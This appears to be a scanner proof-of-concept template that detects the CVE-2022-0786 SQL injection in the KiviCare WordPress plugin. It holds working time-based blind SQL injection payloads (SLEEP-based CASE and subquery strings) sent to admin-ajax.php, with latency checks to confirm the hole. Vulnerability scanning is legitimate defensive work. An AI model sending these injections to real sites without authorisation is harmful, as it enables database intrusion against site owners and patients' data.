name: poc-yaml-wordpress-kivicare-cve-2022-0786-sqli
manual: true
transport: http
set:
    rInt0: string("0")
    rInt1: string(randomInt(5, 9))
    rInt2: string(randomInt(2, 4))
payloads:
    payloads:
        post:
            action: |
                "ajax_post"
            sleep0: |
                "%5bid%5d=(CASE+WHEN+(4=4)+THEN+SLEEP(" + rInt0 + ")+ELSE+5+END)"
            sleepn: |
                "%5bid%5d=(CASE+WHEN+(4=4)+THEN+SLEEP(" + rInt1 + ")+ELSE+5+END)"
            confirm: |
                "%5bid%5d=(CASE+WHEN+(4=4)+THEN+SLEEP(" + rInt2 + ")+ELSE+5+END)"
        getA:
            action: |
                "ajax_get"
            sleep0: |
                '=%7B"id":"(CASE+WHEN+(4=4)+THEN+SLEEP(' + rInt0 + ')+ELSE+5+END)"%7D'
            sleepn: |
                '=%7B"id":"(CASE+WHEN+(4=4)+THEN+SLEEP(' + rInt1 + ')+ELSE+5+END)"%7D'
            confirm: |
                '=%7B"id":"(CASE+WHEN+(4=4)+THEN+SLEEP(' + rInt2 + ')+ELSE+5+END)"%7D'
        getB:
            action: |
                "ajax_get"
            sleep0: |
                '=%7B"id":"1+AND+(SELECT+42+FROM+(SELECT(SLEEP(' + rInt0 + ')))b)"%7D'
            sleepn: |
                '=%7B"id":"1+AND+(SELECT+42+FROM+(SELECT(SLEEP(' + rInt1 + ')))b)"%7D'
            confirm: |
                '=%7B"id":"1+AND+(SELECT+42+FROM+(SELECT(SLEEP(' + rInt2 + ')))b)"%7D'
        getC:
            action: |
                "ajax_get"
            sleep0: |
                '=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(' + rInt0 + ')))b'
            sleepn: |
                '=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(' + rInt1 + ')))b'
            confirm: |
                '=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(' + rInt2 + ')))b'
rules:
    check:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action={{action}}&route_name=get_doctor_details&clinic_id{{sleep0}}
        expression: response.status == 200 && response.body_string.contains("Doctor details")
        output:
            checklatency: response.latency
    r0:
        request:
            cache: true
            method: GET
            read_timeout: "10"
            path: /wp-admin/admin-ajax.php?action={{action}}&route_name=get_doctor_details&clinic_id{{sleepn}}
        expression: response.status == 200 && response.latency - checklatency > rInt1 * 1000 - 500
    r1:
        request:
            cache: true
            method: GET
            read_timeout: "10"
            path: /wp-admin/admin-ajax.php?action={{action}}&route_name=get_doctor_details&clinic_id{{confirm}}
        expression: response.status == 200 && response.latency - checklatency > rInt2 * 1000 - 500
expression: check() && r0() && r1()
detail: 
    author: Editor
    links:
        - https://wpscan.com/vulnerability/53f493e9-273b-4349-8a59-f2207e8f8f30
    vulnerability:
        id: CT-439433
        level: critical